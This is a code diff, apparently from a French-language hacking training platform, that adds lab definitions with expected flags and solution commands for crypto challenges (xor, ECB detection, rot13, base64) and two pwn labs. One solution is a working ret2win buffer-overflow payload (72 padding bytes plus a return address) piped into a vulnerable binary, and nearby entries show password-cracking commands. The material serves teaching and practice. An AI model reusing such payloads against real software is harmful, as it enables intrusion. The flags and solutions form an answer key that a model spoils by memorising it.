@@ -303,6 +303,23 @@ LABS = {
                             "john --show hashes.txt"},
     "pass_08": {"cwd": "/home/hacker/crack", "timeout": 60, "checks": [{"out": "letmein"}],
                 "solution": "fcrackzip -u -D -p wordlist.txt secret.zip"},
+
+    # ── Cryptographie (boîte à outils locale : encode/xor/cipher/magic/ecb) ─
+    "crypt_01": {"cwd": "/home/hacker/crypto", "checks": [{"out": "FLAG{xor_octet_unique_casse}"}],
+                 "solution": "xor -b secret.xor"},
+    "crypt_06": {"cwd": "/home/hacker/crypto", "checks": [{"out": "FLAG{ecb_mode_detecte}"}],
+                 "solution": "ecb-detect cipher.hex"},
+    "crypt_07": {"cwd": "/home/hacker/crypto", "checks": [{"out": "FLAG{encodage_multiple}"}],
+                 "solution": "magic mystere.txt"},
+    "crypt_09": {"cwd": "/home/hacker/crypto", "checks": [{"out": "FLAG{cesar_rot13_decode}"}],
+                 "solution": "cipher --rot13 classique.txt"},
+    "crypt_10": {"cwd": "/home/hacker/crypto", "checks": [{"out": "aGFja3F1ZXN0"}],
+                 "solution": "encode --base64 hackquest"},
+
+    # ── PWN (vrai binaire vulnérable : ret2win) ──────────────────────────
+    "pwn_01": {"checks": [{"out": "Aa0Aa1Aa2"}], "solution": "patterngen 200"},
+    "pwn_02": {"cwd": "/home/hacker/pwn", "checks": [{"re": r"FLAG\{ret2win_buffer_overflow\}"}],
+               "solution": "python3 -c \"import sys;sys.stdout.buffer.write(b'A'*72+(0x401a05).to_bytes(8,'little'))\" | ./vuln"},
 }
 
 # Indice contextuel affiché au début de chaque labo (où chercher)
@@ -345,4 +362,8 @@ WHERE = {
     "watk_04": "formulaire http://127.0.0.1/login (paramètres user & password)",
     "pass_01": "crack/hash.txt", "pass_07": "crack/hashes.txt + crack/wordlist.txt",
     "pass_08": "crack/secret.zip + crack/wordlist.txt",
+    "crypt_01": "crypto/secret.xor", "crypt_06": "crypto/cipher.hex",
+    "crypt_07": "crypto/mystere.txt", "crypt_09": "crypto/classique.txt",
+    "crypt_10": "outil : encode (base64/hex/url)",
+    "pwn_01": "outil : patterngen", "pwn_02": "pwn/vuln (fonction cachée win(), offset 72)",
 }
